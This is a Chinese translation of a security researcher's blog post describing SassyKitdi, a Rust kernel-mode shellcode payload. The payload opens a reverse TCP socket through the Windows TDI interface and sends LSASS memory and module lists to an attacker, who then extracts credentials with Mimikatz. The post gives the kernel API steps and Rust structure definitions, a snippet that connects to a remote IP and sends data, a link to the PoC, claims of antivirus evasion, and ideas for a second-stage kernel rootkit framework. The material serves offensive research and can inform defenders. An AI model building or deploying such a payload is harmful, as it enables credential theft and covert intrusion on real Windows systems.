> 原文链接: https://www.anquanke.com//post/id/214787 


# SassyKitdi：内核模式TCP套接字+LSASS转储


                                阅读量   
                                **148477**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">5</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者zerosum0x0，文章来源：zerosum0x0.blogspot.com
                                <br>原文地址：[https://zerosum0x0.blogspot.com/2020/08/sassykitdi-kernel-mode-tcp-sockets.html](https://zerosum0x0.blogspot.com/2020/08/sassykitdi-kernel-mode-tcp-sockets.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t01e1379ac0d8e64ea7.png)](https://p4.ssl.qhimg.com/t01e1379ac0d8e64ea7.png)



## 0x00 概述

本文主要介绍Windows NT的内核模式Payload，称为“SassyKitdi”（LSASS+Rootkit+TDI）。这种Payload可以通过远程内核漏洞利用（例如：EternalBlue、BlueKeep、SMBGhost）以及本地内核漏洞利用（例如：恶意驱动程序）进行部署。从Windows 2000到Windows 10，这个漏洞的Payload是通用的，在Payload中不再需要携带DKOM偏移量。

Payload与用户模式不会进行任何交互，并使用传输驱动程序接口（TDI）创建反向TCP套接字，该接口是更现代的Winsock内核（WSK）的前身。LSASS.exe进程内存和模块随后通过网络发送，这些信息将转换为minidump文件发送到攻击者一侧，并通过使用Mimikatz等工具提取用户凭据。

PoC位于：[https://github.com/zerosum0x0/SassyKitdi](https://github.com/zerosum0x0/SassyKitdi)

其中，位置无关的Shellcode大小约为3300字节，完全使用Rust编程语言编写，其中使用了许多高级抽象。在这里，我将描述使用Rust语言来实现Shellcode需求的一些优势，并说明需要采取的防范措施。

SassyKitdi方法的简化示意图：

[![](https://p4.ssl.qhimg.com/t01ebe1d8a495e845a2.jpg)](https://p4.ssl.qhimg.com/t01ebe1d8a495e845a2.jpg)

我没有使用所有的反病毒软件对其进行测试，但是考虑到大多数反病毒软件都不会产生告警，因此我可以假设目前这种方法可以绕过大多数反病毒软件。

最后，我将讨论未来的内核模式Rootkit的外观，如果以本文的样本为例，还需要进行一些进一步的操作。这也正所谓是老瓶装新酒。



## 0x01 传输驱动程序接口

TDI是与所有类型的网络传输进行通信的传统方式。使用这种方式，可以建立与攻击者的反向TCP连接。其他Payload（例如绑定套接字、UDP）将遵循类似的方法。

在Rootkit中，TDI的使用并不普遍，但在一些书中已经进行了详细的说明，这些书可以作为参考：

Vieler, R. (2007). Professional Rootkits. Indianapolis, IN: Wiley Technology Pub.<br>
Hoglund, G., &amp; Butler, J. (2009). Rootkits: Subverting the Windows Kernel. Upper Saddle River, NJ: Addison-Wesley.

### <a class="reference-link" name="1.1%20%E6%89%93%E5%BC%80TCP%E8%AE%BE%E5%A4%87%E5%AF%B9%E8%B1%A1"></a>1.1 打开TCP设备对象

根据设备名称（在示例中为\Device\Tcp）可以找到TDI设备对象。本质上，我们将ZwCreateFile()内核API与设备名称一起使用，并通过文件扩展属性来传递选项。

```
pub type ZwCreateFile = extern "stdcall" fn(
        FileHandle:         PHANDLE,
        AccessMask:         ACCESS_MASK,
        ObjectAttributes:   POBJECT_ATTRIBUTES,
        IoStatusBlock:      PIO_STATUS_BLOCK,
        AllocationSize:     PLARGE_INTEGER,
        FileAttributes:     ULONG,
        ShareAccess:        ULONG,
        CreateDisposition:  ULONG,
        CreateOptions:      ULONG,
        EaBuffer:           PVOID,
        EaLength:           ULONG,
    ) -&gt; NTSTATUS;
```

设备名称在`ObjectAttributes`字段中传递，而配置则在`EaBuffer`中传递。我们必须创建一个传输句柄（FEA: TransportAddress）和一个连接句柄（FEA: ConnectionContext）。

TransportAddress FEA采用`TRANSPORT_ADDRESS`结构，对于IPv4而言，该结构中还包含一些其他结构。这时，我们可以选择要绑定到的接口或者要使用的接口。在这里，我们选择0.0.0.0的0端口，内核将使用随机临时端口绑定到主端口。

```
#[repr(C, packed)]
    pub struct TDI_ADDRESS_IP `{`
        pub sin_port:   USHORT,
        pub in_addr:    ULONG,
        pub sin_zero:   [UCHAR; 8],
    `}`

    #[repr(C, packed)]
    pub struct TA_ADDRESS `{`
        pub AddressLength:  USHORT,
        pub AddressType:    USHORT,
        pub Address:        TDI_ADDRESS_IP,
    `}`

    #[repr(C, packed)]
    pub struct TRANSPORT_ADDRESS `{`
        pub TAAddressCount:     LONG,
        pub Address:            [TA_ADDRESS; 1],
    `}`
```

ConnectionContext FEA允许设置任意上下文，而不是定义的结构。在示例代码中，我们将其设置为NULL并继续。

至此，已经创建了传输句柄、传输文件对象、连接句柄和连接文件对象。

### <a class="reference-link" name="1.2%20%E8%BF%9E%E6%8E%A5%E5%88%B0%E7%BB%88%E7%AB%AF"></a>1.2 连接到终端

在进行初始设置后，其余的TDI API将通过IOCTL执行设备对象，这些设备对象与我们的文件对象相关联。

TDI使用`IRP_MJ_INTERNAL_DEVICE_CONTROL`，其中包含部分最小化代码。我们比较关注的是：

```
#[repr(u8)]
    pub enum TDI_INTERNAL_IOCTL_MINOR_CODES `{`
        TDI_ASSOCIATE_ADDRESS     = 0x1,
        TDI_CONNECT               = 0x3,
        TDI_SEND                  = 0x7,
        TDI_SET_EVENT_HANDLER     = 0xb,
    `}`
```

在这些内部IOCTL中，每一个都有与之关联的各种结构。基本方法是：

1、使用`IoGetRelatedDeviceObject()`从文件对象获取设备对象。<br>
2、使用`IoBuildDeviceIoControlRequest()`创建内部IOCTL IRP。<br>
3、在`IO_STACK_LOCATION.MinorFunction`中设置操作码。<br>
4、将操作的结构指针复制到`IO_STACK_LOCATION.Parameters`。<br>
5、使用`IofCallDriver()`调度IRP。<br>
6、等待使用`KeWaitForSingleObject()`完成操作（可选）。

对于`TDI_CONNECT`操作，IRP参数包括一个`TRANSPORT_ADDRESS`结构。这次，我们没有将其设置为0.0.0.0的0端口，而是将其设置为我们要连接的位置的地址（使用大字节序）。

### <a class="reference-link" name="1.3%20%E9%80%9A%E8%BF%87%E6%9C%89%E7%BA%BF%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE"></a>1.3 通过有线发送数据

如果连接IRP成功建立了TCP连接，则可以将TDI_SEND IRP发送到TCP设备。

TDI驱动程序需要一个用于描述通过网络发送的缓冲区的内存描述符列表（MDL）。

假设我们要通过网络发送一些任意数据，我们必须执行以下操作：

1、使用`ExAllocatePool()`和`RtlCopyMemory()`对缓冲区和数据进行操作（可选）。<br>
2、通过`IoAllocateMdl()`提供缓冲区地址和大小。<br>
3、使用MmProbeAndLockPages()在发送操作期间实现分页。<br>
4、调度发送IRP。<br>
5、I/O管理器将解锁页面并释放MDL。<br>
6、`ExFreePool()`缓冲区（可选）。

在这种情况下，MDL将附加到IRP。我们可以将`Parameters`结构中的SendFlags设置为0，将`SendLength`设置为数据大小。

```
#[repr(C, packed)]
    pub struct TDI_REQUEST_KERNEL_SEND `{`
        pub SendLength:    ULONG,
        pub SendFlags:     ULONG,
    `}`
```



## 0x02 从内核模式转储LSASS

LSASS是Windows提供的一个宝藏，攻击者可以从中获得明文凭据、Kerberos信息等内容。在尝试从用户模式进行转储时，许多反病毒软件厂商都非常关注加固LSASS。我们首先从内核的特权开始入手。

Mimikatz需要3个流来处理mimidump：系统信息、内存范围和模块列表。

### <a class="reference-link" name="2.1%20%E8%8E%B7%E5%8F%96%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"></a>2.1 获取操作系统信息

Mimikatz实际上只需要知道NT的主要版本、次要版本和内部版本。这些可以通过NTOSKRNL导出函数`RtlGetVersion()`获得，该函数提供了以下结构：

```
#[repr(C)]
    pub struct RTL_OSVERSIONINFOW `{`
        pub dwOSVersionInfoSize:        ULONG,
        pub dwMajorVersion:             ULONG,
        pub dwMinorVersion:             ULONG,
        pub dwBuildNumber:              ULONG,
        pub dwPlatformId:               ULONG,
        pub szCSDVersion:               [UINT16; 128],   
    `}`
```

### <a class="reference-link" name="2.2%20%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F"></a>2.2 获取所有内存区域

LSASS转储中最重要的部分就是LSASS进程的实际内存。使用`KeStackAttachProcess()`可以读取LSASS的虚拟内存。然后，可以使用`ZwQueryVirtualMemory()`遍历整个内存范围。

```
pub type ZwQueryVirtualMemory = extern "stdcall" fn(
        ProcessHandle:              HANDLE,
        BaseAddress:                PVOID,
        MemoryInformationClass:     MEMORY_INFORMATION_CLASS,
        MemoryInformation:          PVOID,
        MemoryInformationLength:    SIZE_T,
        ReturnLength:               PSIZE_T,
    ) -&gt; crate::types::NTSTATUS;
```

向`ProcessHandle`传入`-1`，向`BaseAddress`传入`0`，并使用“类接收以下结构：

```
#[repr(C)]
    pub struct MEMORY_BASIC_INFORMATION `{`
        pub BaseAddress:            PVOID,
        pub AllocationBase:         PVOID,
        pub AllocationProtect:      ULONG,
        pub PartitionId:            USHORT,
        pub RegionSize:             SIZE_T,
        pub State:                  ULONG,
        pub Protect:                ULONG,
        pub Type:                   ULONG,
    `}`
```

对于`ZwQueryVirtualMemory()`的下一次循环，只需将下一个`BaseAddress`设置为`BaseAddress+RegionSize`。持续循环，直到`ReturnLength`为`0`或出现NT错误。

### <a class="reference-link" name="2.3%20%E6%94%B6%E9%9B%86%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97%E5%88%97%E8%A1%A8"></a>2.3 收集加载模块列表

Mimikatz还需要知道一些DLL在内存中的位置，以便在处理过程中，从中窃取一些秘密。

进行循环的最简单方法，就是从PEB中获取DLL列表。可以使用`ProcessBasicInformation`类的`ZwQueryInformationProcess()`找到PEB。

Mimikatz需要DLL名称、地址和大小。这些内容很容易从`PEB-&gt;Ldr.InLoadOrderLinks`中获得，因为这个方法有大量的配套文档说明，可以根据这些文档轻松获取`LDR_DATA_TABLE_ENTRY`条目的链表。

```
#[cfg(target_arch="x86_64")]
    #[repr(C, packed)]
    pub struct LDR_DATA_TABLE_ENTRY `{`
        pub InLoadOrderLinks:               LIST_ENTRY,
        pub InMemoryOrderLinks:             LIST_ENTRY,
        pub InInitializationOrderLinks:     LIST_ENTRY,
        pub DllBase:                        PVOID,
        pub EntryPoint:                     PVOID,
        pub SizeOfImage:                    ULONG,
        pub Padding_0x44_0x48:              [BYTE; 4],
        pub FullDllName:                    UNICODE_STRING,
        pub BaseDllName:                    UNICODE_STRING,
        /* ...etc... */
    `}`
```

只需要循环链表，直到我们回到最开始，就能够获取转储文件每个DLL的`FullDllName`、`DllBase`和`SizeOfImage`。



## 0x03 Rust Shellcode

Rust是当前流行的一种更为现代的语言。它不需要运行时，可以用于编写与C FFI交互的非常底层的嵌入式代码。据我所知，C/C++仅能够实现一点点Rust无法实现的事情，比如C可变参数函数和SEH（内部紧急操作之外）。

使用mingw-w64链接器从Linux交叉编译Rust，并使用Rustup添加x86_64-windows-pc-gnu目标的这一过程非常简单。我创建了一个DLL项目，并提取`_DllMainCRTStartup()`和`malloc()`之间的代码。也许不是很稳定，但我只能弄清楚如何生成PE文件，还是不太清楚例如COM文件之类的东西。

下面是一个示例，说明Rust中的Shellcode具有多么出色的性能：

```
let mut socket = nttdi::TdiSocket::new(tdi_ctx);

    socket.add_recv_handler(recv_handler);
    socket.connect(0xdd01a8c0, 0xBCFB)?;  // 192.168.1.221:64444

    socket.send("abc".as_bytes().as_ptr(), 3)?;
```

### <a class="reference-link" name="3.1%20%E7%BC%96%E8%AF%91%E5%99%A8%E4%BC%98%E5%8C%96"></a>3.1 编译器优化

Rust位于最终代码生成前的中间语言LLVM上，所以也受益于多年来诸如C++(Clang)之类的语言进行的诸多优化。

我在这一点上不会深挖太多，但Rust的高度静态编译特性通常会导致代码大小比C/C++语言编译的代码小得多。代码大小并不一定是性能的指标，但是对于Shellcode而言，还是很重要的。我们可以进行自己的测试，但总而言之，Rust生成的代码质量非常好。

我们可以将`Cargo.toml`文件设置为使用`opt-level='z'`（优化大小）和`lto=true`（链接时间优化），以进一步减小生成代码的大小。

### <a class="reference-link" name="3.2%20%E4%BD%BF%E7%94%A8%E9%AB%98%E7%BA%A7%E6%9E%84%E9%80%A0"></a>3.2 使用高级构造

使用Rust最明显的优势在于RAll。在Windows中，这意味着当我们的封装对象超出范围时，可以自动关闭HANDLE，自动释放内核池等等。这些示例的简单构造函数和析构函数中都插入了我们的Rust编译器标志。

Rust具有诸如`Result&lt;Ok, Err&gt;`返回类型以及[`? 'unwrap or throw'`](https://doc.rust-lang.org/edition-guide/rust-2018/error-handling-and-panics/the-question-mark-operator-for-easier-error-handling.html)的概念，可以用简化的方式来弹出错误。如果出现问题，我们可以在Ok slot中返回元组，并在Err slot中返回NTSTATUS代码。这个功能的代码生成量很少，通常会返回两倍宽的结构。其消耗的基本上等于手动完成的字节数，但是大大简化了高级代码。

出于编写Shellcode的目的，我们不能使用`std`库，而只能使用Rust的`core`。此外，由于代码与位置无关，因此许多开源crate库都不能使用。因此，创建了一个名为`ntdef`的新crate，其中仅包含类型的定义和0静态位置的信息。如果我们需要基于栈的宽字符串，可以查看JennaMagius的stacklstr crate。

由于代码的低级性质，它必须与内核进行FFI交互，必须携带上下文指针，因此大多数Shellcode都是“不安全的”Rust代码。

手工编写Shellcode的过程比较繁琐，并且通常会有冗长的调试会话。但使用Rust这样的高级抽象语言编写程序集模板可以节省大量的开发时间。人工构造总是会让代码更小，如果有一个指南的帮助，可能这个过程会更加顺利。另外，优化编译器是由人工编写的，没有考虑所有的特殊边界情况。



## 0x04 总结

SassyKitdi必须以`PASSIVE_LEVEL`执行。要在漏洞利用Payload中使用示例项目，我们需要提供自己的漏洞利用前导（preamble）。这是漏洞利用过程中比较独特的一个地方，例如EternalBlue就是运行在IRQL为`DISPATCH_LEVEL`的级别上。

这里的有趣之处在于，将TDI漏洞利用Payload的使用转变为类似内核模式的Meterpreter框架。如果要调整提供的代码，下载并执行更大的第二阶段内核模式Payload，这个过程非常容易，可以采用反射加载驱动（reflectively-loaded driver）的形式。这样的框架可以轻松访问令牌、文件，可以放心执行当前在用户模式下容易被反病毒软件捕获到的许多其它功能。原始的Shellcode可以缩减到1000-1500字节左右。
